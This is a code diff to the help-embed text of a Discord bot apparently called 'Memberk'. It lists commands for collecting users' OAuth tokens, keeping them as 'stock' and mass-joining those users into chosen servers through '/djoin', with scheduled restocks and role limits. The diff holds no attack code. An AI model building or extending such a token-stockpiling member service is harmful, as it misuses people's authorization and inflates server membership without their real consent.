@@ -32,89 +32,113 @@ function now(): Date {
 
 export function helpEmbed(): EmbedBuilder {
   return new EmbedBuilder()
-    .setTitle("🤖 Members Bot — All Commands")
+    .setTitle("🤖 Memberk — All Commands")
     .setColor(COLOR.blurple)
     .setTimestamp(now())
     .addFields(
       {
         name: "🔐 Authentication",
         value:
-          "`/get_token` or `!get_token` — Get auth link\n" +
-          "`/auth code:CODE` or `!auth CODE` — Authenticate\n" +
-          "`/check_tokens` or `!check_tokens` — Validate tokens",
+          "`/get_token` — Get your OAuth link\n" +
+          "`/auth code:CODE` — Manually authenticate with a code\n" +
+          "`/check_tokens` — Validate all stored tokens (owners only)",
       },
       {
         name: "🚀 Mass Joining",
         value:
-          "`/djoin server_id:ID` or `!djoin ID` — Add all users to server\n" +
-          "`/servers` or `!servers` — List bot servers\n" +
-          "`/server_age` or `!server_age [ID]` — Check server age",
+          "`/djoin server_id:ID` — Add all stock users to a server (owners only)\n" +
+          "`/servers` — List all servers the bot is in\n" +
+          "`/server_age [server_id]` — Check when a server was joined\n" +
+          "`/cleanup_servers` — Leave all non-main servers (owners only)",
       },
       {
-        name: "👥 User Management",
+        name: "📦 Stock & Users",
         value:
-          "`/count` — Stored token count\n" +
-          "`/list_users` — List authenticated users\n" +
-          "`/restock` — Push authenticated users into bulk stock (owners only)\n" +
-          "`/clear_stock` — Remove all stored tokens (owners only)\n" +
-          "`/schedule_restock time:1h` — Schedule a restock (owners only)\n" +
+          "`/stock` — Show current bulk stock count\n" +
+          "`/count` — Show stored token count\n" +
+          "`/list_users` — List all authenticated users\n" +
+          "`/restock [count]` — Move stored tokens into bulk stock (owners only)\n" +
+          "`/clear_stock` — Wipe all bulk stock (owners only)",
+      },
+      {
+        name: "📅 Schedules",
+        value:
+          "`/schedule_restock time:1h` — Schedule a one-off restock (owners only)\n" +
           "`/list_schedules` — View pending schedules (owners only)\n" +
           "`/cancel_schedule id:ID` — Cancel a schedule (owners only)\n" +
-          "`/set_daily_restock time:14:00` — Daily restock (owners only)\n" +
-          "`/cancel_daily_restock` — Cancel daily restock (owners only)\n" +
-          "`/daily_restock_status` — Show daily config (owners only)",
+          "`/set_daily_restock time:14:00` — Set a daily restock (owners only)\n" +
+          "`/cancel_daily_restock` — Cancel the daily restock (owners only)\n" +
+          "`/daily_restock_status` — Show daily restock config (owners only)",
       },
       {
         name: "👑 Owner Management",
         value:
           "`/owners` — List all owners\n" +
-          "`/control_panel` — Open the interactive owner control panel\n" +
-          "`/setowner_role @role` — Grant owner access by role\n" +
-          "`/removeowner_role @role` — Revoke owner role\n" +
+          "`/control_panel` — Open the interactive control panel\n" +
+          "`/setowner_role role:@Role` — Grant owner access by role\n" +
+          "`/removeowner_role role:@Role` — Revoke an owner role\n" +
           "`/listowner_roles` — List all owner roles\n" +
-          "`/restart` — Restart bot process\n" +
-          "`/deploy` — Trigger a Railway redeploy (owners only)\n" +
-          "`/dashboard` — Get private dashboard link (owners only)",
+          "`/restart` — Restart the bot process\n" +
+          "`/deploy` — Trigger a Railway redeploy\n" +
+          "`/dashboard` — Get the private dashboard link",
       },
       {
-        name: "🎭 Role Limits",
+        name: "🎭 Role Limits & 📌 Channel Locks",
         value:
-          "`/setrole role:@Role limit:N` — Set role djoin limit\n" +
-          "`/removerole role:@Role` — Remove role limit\n" +
-          "`/listroles` — List all role limits",
+          "`/setrole role:@Role limit:N` — Set per-role djoin limit\n" +
+          "`/removerole role:@Role` — Remove a role limit\n" +
+          "`/listroles` — List all role limits\n" +
+          "`/setchannel type:djoin channel:#ch` — Lock a command to a channel\n" +
+          "`/clearchannel type:djoin` — Remove a channel lock\n" +
+          "`/listchannels` — Show all channel locks",
       },
       {
-        name: "📌 Channel Locks",
+        name: "📺 Live Embeds",
         value:
-          "`/setchannel type:djoin channel:#ch` — Lock djoin to channel\n" +
-          "`/setchannel type:auth channel:#ch` — Lock auth to channel\n" +
-          "`/clearchannel type:djoin` — Remove lock\n" +
-          "`/listchannels` — Show channel locks",
+          "`/live_stock` — Post a live-updating stock embed (owners only)\n" +
+          "`/live_status` — Post a live-updating status embed (owners only)",
       },
       {
-        name: "📣 Announcements (Gecko)",
+        name: "🔔 Auto-ping",
+        value:
+          "`/autoping_set channel:#ch` — Ping new members in a channel\n" +
+          "`/autoping_clear` — Disable auto-ping\n" +
+          "`/autoping_status` — Show current auto-ping config\n" +
+          "`/autoping_test` — Send a test ping for yourself",
+      },
+      {
+        name: "📣 Gecko Announcements",
         value:
           "`/setup_subscribe` — Post the opt-in subscribe embed\n" +
-          "`/announce message:...` — DM subscribers an announcement\n" +
-          "`/subscribers` — Count subscribers in this server\n" +
-          "`/send_verify [#channel]` — Post public verification embed (owners only)",
+          "`/announce message:...` — DM all subscribers\n" +
+          "`/subscribers` — Count subscribers in this server",
+      },
+      {
+        name: "✅ Verification (Bot 2)",
+        value:
+          "`/send_verify [channel] [image]` — Post the verification embed (owners only)\n" +
+          "_Run this command from Bot 2 in your verify channel._",
       },
       {
         name: "🔧 Utility",
         value:
-          "`/invite` — Bot invite link\n" +
-          "`/add` — Add bot embed\n" +
-          "`/stock` — Show current token stock\n" +
-          "`/status` — Show bot online status & stats\n" +
-          "`/cleanup_servers` — Leave all other servers (owners only)\n" +
+          "`/invite` — Bot 1 invite link\n" +
+          "`/add` — Add Bot 3 to a server\n" +
+          "`/status` — Bot status & uptime\n" +
           "`/help` — Show this message",
+      },
+      {
+        name: "🚫 Super-owner Only",
+        value:
+          "`/blacklist user_id:ID` · `/unblacklist` · `/blacklist_list`\n" +
+          "`/enable_server` · `/disable_server` · `/list_allowed_servers`",
       },
       {
         name: "⚠️ Notes",
         value:
           "• Bot auto-leaves servers after 14 days\n" +
-          "• Both `/` slash commands and `!` prefix commands work\n" +
-          "• Role-limit / channel commands: owner only",
+          "• Prefix `!` versions work for most commands\n" +
+          "• Owner-only commands require owner role or hardcoded owner ID",
       },
     );
 }
